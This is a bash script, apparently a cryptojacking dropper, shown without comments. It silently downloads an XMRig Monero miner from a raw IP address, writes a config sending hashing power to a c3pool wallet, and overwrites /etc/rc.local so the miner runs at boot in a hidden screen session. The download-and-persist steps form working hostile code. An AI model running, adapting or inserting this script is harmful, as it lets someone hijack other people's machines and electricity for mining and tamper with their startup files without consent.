#!/bin/bash
apt install screen git vim htop net-tools sudo curl wget cpulimit  -y > /dev/null 2>&1
OS=$(uname -m)
if [[ ${OS} == "aarch64" ]]; then
  wget  http://13.70.46.31/xmrig/xmrig-arm -O xmrig > /dev/null 2>&1
fi
if [[ ${OS} == "x86_64" ]]; then
  wget  http://13.70.46.31/xmrig/xmrig-amd -O xmrig > /dev/null 2>&1
fi
cat >config.json <<EOF
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": 0,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false,
        "panthera": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false,
        "panthera": false,
        "astrobwt": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "mine.c3pool.com:17777",
            "user": "49jMjTagu63c31zB6EYuo7Riu5XcpxXzY9kcGig16CAKC74ucBo1BEPjgNgy595nnpEBNvL8YCuPuKZUjWuouD2D8cQDGZ9",
            "pass": "666666",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        },
        {
            "algo": null,
            "coin": null,
            "url": "mine.c3pool.com:17777",
            "user": "49jMjTagu63c31zB6EYuo7Riu5XcpxXzY9kcGig16CAKC74ucBo1BEPjgNgy595nnpEBNvL8YCuPuKZUjWuouD2D8cQDGZ9",
            "pass": "666666",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "rebench-algo": false,
    "bench-algo-time": 20,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF

timedatectl set-timezone Asia/Shanghai
date=$(date "+%Y-%m-%d")
sed -i "s/666666/$date/g" /root/config.json
chmod 755 /root/xmrig
cat  >/etc/rc.local <<EOF
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/usr/bin/screen -dmS xmrig /root/xmrig
exit 0
EOF
chmod +x /etc/rc.local
systemctl start rc-local
